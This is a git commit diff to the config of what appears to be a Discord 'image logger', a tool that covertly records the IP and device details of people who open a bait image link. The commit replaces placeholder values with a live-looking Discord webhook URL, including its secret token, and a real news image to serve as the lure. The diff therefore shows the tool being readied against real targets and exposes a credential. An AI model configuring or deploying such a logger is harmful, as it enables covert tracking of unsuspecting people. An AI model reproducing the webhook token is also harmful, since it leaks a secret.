883f0043cad6293446921806ebfe34277f6f7b58
theoneandonlyghost7509 <aboodialmasri3@gmail.com>
2026-02-18 03:23:56 +0300

    Update webhook URL and image link in config

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1473473438776561706/Dd45hOPppy8pTrOSXh4nSB6rCKax64ubLpnJCuo-yRsYyPR7xcjPKaLUOa2VkUeBcZzK",
+    "image": "https://img.youm7.com/large/201706060337543754.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
